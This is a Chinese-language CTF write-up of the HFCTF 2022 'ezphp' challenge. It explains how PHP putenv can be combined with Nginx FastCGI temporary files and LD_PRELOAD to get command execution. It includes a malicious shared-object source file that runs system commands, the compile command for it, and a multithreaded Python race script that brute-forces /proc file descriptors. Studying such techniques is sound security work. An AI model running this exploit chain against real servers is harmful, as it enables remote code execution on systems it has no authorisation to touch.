---
id: hf2022-ezphp
title: hf2022-ezphp
---



## 前言

当时是没做出来，一直在看P神的这篇：[我是如何利用环境变量注入执行任意命令 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html#0x06-bash_env)

后来发现wp都看不懂！！就打算复现学习一下，属于是那段时间没打比赛拉下的东西

## 题目环境

1. docker环境[My-CTF-Challenges/hfctf-2022/ezphp at master · waderwu/My-CTF-Challenges (github.com)](https://github.com/waderwu/My-CTF-Challenges/tree/master/hfctf-2022/ezphp)

   这里我用的docker file搭了个本地，把文件解压到目录下

   下面是当时的history，最后访问vps映射的端口就行了
   ps：url要加上index.php（因为优先选择了存在的index.nginx-debian.html）

   ```
   docker build .
   docker images
   docker run -d -p 8899:80 --name testphp d7ffa14d954b
   docker ps
   docker exec -it 2d43 /bin/bash
   ```
   
2. 也可以去pwnthebox或者buu的环境：

   - [题库 | PwnTheBox - Hacking Platform - CTF Platform](https://ce.pwnthebox.com/challenges?q=ezphp&page=1&id=1906)
   - [BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[HFCTF2022]ezchain)

## 正文

题目如下：

```php
<?php (empty($_GET["env"])) ? highlight_file(__FILE__) : putenv($_GET["env"]) && system('echo hfctf2022');?>
```

看到就想起了P神的这篇：

> [我是如何利用环境变量注入执行任意命令 | 离别歌](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html#0x06-bash_env)
> php中调用system本质上是调用了`sh -c`
>
> 在不同操作系统中：
>
> - debian：sh→dash
> - centos：sh→bash
>
> 总结：
>
> - `BASH_ENV`：可以在`bash -c`的时候注入任意命令
> - `ENV`：可以在`sh -i -c`的时候注入任意命令
> - `PS1`：可以在`sh`或`bash`交互式环境下执行任意命令
> - `PROMPT_COMMAND`：可以在`bash`交互式环境下执行任意命令
> - `BASH_FUNC_xxx%%`：可以在`bash -c`或`sh -c`的时候执行任意命令

不过本题的环境是debian系统，也就是P神也未完美解决的dash，然后有很多师傅都跑去审dash源码

> 我看了两晚上dash代码，几乎要给我看吐了，我很难理解为什么代码里要用这么多goto。最后还是很遗憾，虽然找到了两个可以进行命令注入的环境变量，但它们都不能在sh -c时触发。

看了wp，本题涉及到的是另外的利用点：

- Nginx临时文件 
  [hxp CTF 2021 - A New Novel LFI - 跳跳糖](https://tttang.com/archive/1384/)
  [0xbb - PHP LFI与Nginx协助 (bierbaumer.net)](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)

  - 当 Nginx 接收来自 FastCGI 的响应时，若大小超过限定值 (大概 32Kb) 不适合以内存的形式来存储的时候，一部分就会以临时文件的方式保存到磁盘上。在 `/var/lib/nginx/fastcgi` 下产生临时文件。
  - 但是Nginx 创建文件就立即删除了，不过Nginx删除的`/var/lib/nginx/fastcgi`下的临时文件，还可以在`/proc/pid/fd/`下找到
    （如果打开一个进程打开了某个文件，某个文件就会出现在 `/proc/pid/fd/` 目录下，而如果该文件没被关闭的情况下就被删除，仍能在对应的`/proc/pid/fd`下找到并读取文件内容）

  

- LD_PRELOAD加载SO

  [通过LD_PRELOAD绕过disable_functions - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/86544746)

  - so文件就是c/c++编译出来的动态链接库，也叫共享库

  - 程序在动态链接时需要一个动态链接库，作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新

  - LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。

    **那就可以构造恶意的so文件，其中是重写的系统函数，当执行代码函数，就会调用恶意库中的系统函数**，从而实现任意系统命令执行，这就需要条件：

    - 能够上传自己的.so文件
    - 能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数

  

那么本题思路如下：

1. 请求一个过大的的文件使得Nginx产生临时文件缓存
2. 传一个填满脏数据的 so文件
3. 遍历 pid 以及 fd ，竞争 LD_PRELOAD 包含 proc目录下的临时文件 从而实现 LFI

> exp.c
>
> ```c
> #include <stdlib.h>
> #include <stdio.h>
> #include <string.h>
> 
> __attribute__ ((__constructor__)) void preload (void){
>   unsetenv("LD_PRELOAD");
>   system("id");
>   system("cat /flag > /var/www/html/flag");
> }
> ```
>
> 编译为so
>
> ```sh
> gcc -shared -fPIC exp.c -o exp.so
> ```
>
> 竞争脚本（这里用的是r3师傅写的[2022 虎符CTF Writeup by 唯独你没懂 (qq.com)](https://mp.weixin.qq.com/s?__biz=Mzg2MjYxMjAzMg==&mid=2247483903&idx=1&sn=26b6af39bc1bf9a0055c0be38a666472&chksm=ce047ed0f973f7c6b7a2ee4a300d10d22cf2a6e38fcbe5190011c8f08b14da9a30db2bf11061&mpshare=1&scene=23&srcid=0321x9PydhpbLJpuag0EBm4W&sharer_sharetime=1647861577180&sharer_shareid=3679f20229d72930158c21ee7f573b1e#rd)）
>
> ```python
> import  threading, requests
> 
> url="https://xxx/"
> nginx_workers = [10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]
> done = False
> 
> 
> def uploader():
>     print('[+] starting uploader')
>     with open("exp.so","rb") as f:
>         data = f.read()
>     while not done:
>         requests.get(url, data=data + (16 * 1024 * 'A').encode())
> for _ in range(16):
>     t = threading.Thread(target=uploader)
>     t.start()
> def bruter(pid):
>     global done
>     while not done:
>         print(f'[+] brute loop restarted: {pid}')
>         for fd in range(4, 32):
>             try:
>                 requests.get(url, params={
>                     'env': f"LD_PRELOAD=/proc/{pid}/fd/{fd}"
>                 })
>             except:
>                 pass
> 
> 
> for pid in nginx_workers:
>     a = threading.Thread(target=bruter, args=(pid, ))
>     a.start()
> 
> ```
>
> 这里因为要遍历pid和fd，所以会久一些。
> 如果是搭在docker里，就可以直接找nginx worker看一下
>
> ```
> ps -ef |grep nginx |grep -v grep
> ```



